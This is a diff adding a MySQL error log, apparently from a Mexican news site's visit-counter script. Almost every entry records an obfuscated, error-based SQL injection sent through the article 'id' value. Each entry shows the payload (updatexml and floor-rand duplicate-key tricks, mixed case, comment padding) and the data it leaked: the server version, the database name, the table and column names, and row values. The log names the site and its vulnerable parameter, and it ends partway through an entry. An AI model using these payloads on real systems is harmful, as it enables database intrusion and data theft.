@@ -1,0 +1,531 @@
+Time : 20:56:02
+SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '?~!opinioncol?~!'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=updatexml(rand(),(/**//**/sElEcT(/**//**/sElEcT /**//**/dIsTiNcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x3f7e21,/**//**/cOlUmN_nAmE,0x3f7e21))) /**//**/fRoM information_schema./**//**/cOlUmNs /**//**/wHeRe /**//**/tAbLe_ScHeMa=0x64656c6264 and /**//**/tAbLe_NaMe=0x6f70696e696f6e /**//**/lImIt 8,1)),0)
+
+Time : 20:56:01
+SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '?~!rumbo?~!'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=updatexml(rand(),(/**//**/sElEcT(/**//**/sElEcT /**//**/dIsTiNcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x3f7e21,/**//**/cOlUmN_nAmE,0x3f7e21))) /**//**/fRoM information_schema./**//**/cOlUmNs /**//**/wHeRe /**//**/tAbLe_ScHeMa=0x64656c6264 and /**//**/tAbLe_NaMe=0x6f70696e696f6e /**//**/lImIt 7,1)),0)
+
+Time : 20:56:00
+SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '?~!visitas?~!'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=updatexml(rand(),(/**//**/sElEcT(/**//**/sElEcT /**//**/dIsTiNcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x3f7e21,/**//**/cOlUmN_nAmE,0x3f7e21))) /**//**/fRoM information_schema./**//**/cOlUmNs /**//**/wHeRe /**//**/tAbLe_ScHeMa=0x64656c6264 and /**//**/tAbLe_NaMe=0x6f70696e696f6e /**//**/lImIt 6,1)),0)
+
+Time : 20:55:59
+SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '?~!imagenautor?~!'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=updatexml(rand(),(/**//**/sElEcT(/**//**/sElEcT /**//**/dIsTiNcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x3f7e21,/**//**/cOlUmN_nAmE,0x3f7e21))) /**//**/fRoM information_schema./**//**/cOlUmNs /**//**/wHeRe /**//**/tAbLe_ScHeMa=0x64656c6264 and /**//**/tAbLe_NaMe=0x6f70696e696f6e /**//**/lImIt 5,1)),0)
+
+Time : 20:55:58
+SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '?~!autor?~!'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=updatexml(rand(),(/**//**/sElEcT(/**//**/sElEcT /**//**/dIsTiNcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x3f7e21,/**//**/cOlUmN_nAmE,0x3f7e21))) /**//**/fRoM information_schema./**//**/cOlUmNs /**//**/wHeRe /**//**/tAbLe_ScHeMa=0x64656c6264 and /**//**/tAbLe_NaMe=0x6f70696e696f6e /**//**/lImIt 4,1)),0)
+
+Time : 20:55:57
+SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '?~!cuerpo?~!'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=updatexml(rand(),(/**//**/sElEcT(/**//**/sElEcT /**//**/dIsTiNcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x3f7e21,/**//**/cOlUmN_nAmE,0x3f7e21))) /**//**/fRoM information_schema./**//**/cOlUmNs /**//**/wHeRe /**//**/tAbLe_ScHeMa=0x64656c6264 and /**//**/tAbLe_NaMe=0x6f70696e696f6e /**//**/lImIt 3,1)),0)
+
+Time : 20:55:56
+SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '?~!titulo?~!'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=updatexml(rand(),(/**//**/sElEcT(/**//**/sElEcT /**//**/dIsTiNcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x3f7e21,/**//**/cOlUmN_nAmE,0x3f7e21))) /**//**/fRoM information_schema./**//**/cOlUmNs /**//**/wHeRe /**//**/tAbLe_ScHeMa=0x64656c6264 and /**//**/tAbLe_NaMe=0x6f70696e696f6e /**//**/lImIt 2,1)),0)
+
+Time : 20:55:55
+SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '?~!date?~!'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=updatexml(rand(),(/**//**/sElEcT(/**//**/sElEcT /**//**/dIsTiNcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x3f7e21,/**//**/cOlUmN_nAmE,0x3f7e21))) /**//**/fRoM information_schema./**//**/cOlUmNs /**//**/wHeRe /**//**/tAbLe_ScHeMa=0x64656c6264 and /**//**/tAbLe_NaMe=0x6f70696e696f6e /**//**/lImIt 1,1)),0)
+
+Time : 20:55:54
+SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '?~!id?~!'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=updatexml(rand(),(/**//**/sElEcT(/**//**/sElEcT /**//**/dIsTiNcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x3f7e21,/**//**/cOlUmN_nAmE,0x3f7e21))) /**//**/fRoM information_schema./**//**/cOlUmNs /**//**/wHeRe /**//**/tAbLe_ScHeMa=0x64656c6264 and /**//**/tAbLe_NaMe=0x6f70696e696f6e /**//**/lImIt 0,1)),0)
+
+Time : 20:55:54
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '?~!9?~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**//**/sElEcT 1 /**//**/fRoM(/**//**/sElEcT count(*),/**//**/cOnCaT((/**//**/sElEcT(/**//**/sElEcT(/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x3f7e21,count(0),0x3f7e21))) /**//**/fRoM information_schema./**//**/cOlUmNs /**//**/wHeRe /**//**/tAbLe_ScHeMa=0x64656c6264 and /**//**/tAbLe_NaMe=0x6f70696e696f6e)) /**//**/fRoM information_schema./**//**/tAbLeS /**//**/lImIt 0,1),floor(rand(0)*2))x /**//**/fRoM information_schema./**//**/tAbLeS /**//**/gRoUp/**/By x)a)
+
+Time : 20:55:48
+SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '?~!opinion?~!'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=updatexml(rand(),(/**//**/sElEcT(/**//**/sElEcT /**//**/dIsTiNcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x3f7e21,/**//**/tAbLe_NaMe,0x3f7e21))) /**//**/fRoM information_schema./**//**/tAbLeS /**//**/wHeRe /**//**/tAbLe_ScHeMa=0x64656c6264 /**//**/lImIt 1,1)),0)
+
+Time : 20:55:47
+SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '?~!noticias?~!'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=updatexml(rand(),(/**//**/sElEcT(/**//**/sElEcT /**//**/dIsTiNcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x3f7e21,/**//**/tAbLe_NaMe,0x3f7e21))) /**//**/fRoM information_schema./**//**/tAbLeS /**//**/wHeRe /**//**/tAbLe_ScHeMa=0x64656c6264 /**//**/lImIt 0,1)),0)
+
+Time : 20:55:46
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '?~!2?~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**//**/sElEcT 1 /**//**/fRoM(/**//**/sElEcT count(*),/**//**/cOnCaT((/**//**/sElEcT(/**//**/sElEcT(/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x3f7e21,count(0),0x3f7e21))) /**//**/fRoM information_schema./**//**/tAbLeS /**//**/wHeRe /**//**/tAbLe_ScHeMa=0x64656c6264)) /**//**/fRoM information_schema./**//**/tAbLeS /**//**/lImIt 0,1),floor(rand(0)*2))x /**//**/fRoM information_schema./**//**/tAbLeS /**//**/gRoUp/**/By x)a)
+
+Time : 20:55:42
+SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '?~!delbd?~!'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=updatexml(rand(),(/**//**/sElEcT(/**//**/sElEcT /**//**/dIsTiNcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x3f7e21,/**//**/sChEmA_nAmE,0x3f7e21))) /**//**/fRoM information_schema./**//**/sChEmAtA /**//**/wHeRe not /**//**/sChEmA_nAmE=0x696e666f726d6174696f6e5f736368656d61 /**//**/lImIt 0,1)),0)
+
+Time : 20:55:40
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '?~!1?~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**//**/sElEcT 1 /**//**/fRoM(/**//**/sElEcT count(*),/**//**/cOnCaT((/**//**/sElEcT(/**//**/sElEcT(/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x3f7e21,count(0),0x3f7e21))) /**//**/fRoM information_schema./**//**/sChEmAtA /**//**/wHeRe not /**//**/sChEmA_nAmE=0x696e666f726d6174696f6e5f736368656d61)) /**//**/fRoM information_schema./**//**/tAbLeS /**//**/lImIt 0,1),floor(rand(0)*2))x /**//**/fRoM information_schema./**//**/tAbLeS /**//**/gRoUp/**/By x)a)
+
+Time : 20:55:28
+SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '?~!delbd?~!'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=updatexml(rand(),(/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x3f7e21,database(),0x3f7e21)))),0)
+
+Time : 20:55:26
+SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '?~!5.7.25-log?~!'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=updatexml(rand(),(/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x3f7e21,version(),0x3f7e21)))),0)
+
+Time : 17:48:27
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '://www.chihuahuahoy.com.mx/noticia.individual.php?id=30710' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=1052http://www.chihuahuahoy.com.mx/noticia.individual.php?id=30710
+
+Time : 17:48:26
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '://www.chihuahuahoy.com.mx/noticia.individual.php?id=30710' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=1052http://www.chihuahuahoy.com.mx/noticia.individual.php?id=30710
+
+Time : 17:48:25
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '://www.chihuahuahoy.com.mx/noticia.individual.php?id=30710' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=1052http://www.chihuahuahoy.com.mx/noticia.individual.php?id=30710
+
+Time : 12:31:34
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 11:29:02
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 05:45:23
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 01:27:45
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2542!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 11,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:44
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2535!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 4,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:43
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2545!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 14,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:42
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2533!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 2,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:41
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2554!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 23,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:40
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2555!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 24,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:39
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!delicias1!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(ubicacion,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 3,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:37
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!nacional1!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(ubicacion,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 12,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:36
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2556!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 25,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:35
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!titular1!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(ubicacion,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 0,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:34
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!chihuahua2!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(ubicacion,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 9,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:33
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!chihuahua3!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(ubicacion,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 10,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:32
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2546!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 15,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:31
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2538!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 7,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:30
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2549!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 18,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:29
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!nacionalprincipal!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(ubicacion,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 29,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:28
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!mundo3!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(ubicacion,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 16,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:26
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2553!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 22,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:25
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!titular1!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(ubicacion,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 17,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:24
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!titular2!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(ubicacion,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 1,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:23
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2550!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 19,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:22
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!chihuahua1!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(ubicacion,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 6,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:21
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2559!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 28,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:20
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2542!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 11,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:19
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!delicias3!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(ubicacion,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 8,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:17
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2557!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 26,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:16
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2552!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 21,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:15
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!chihuahuaprincipal!~!1' for key '<group_key>'
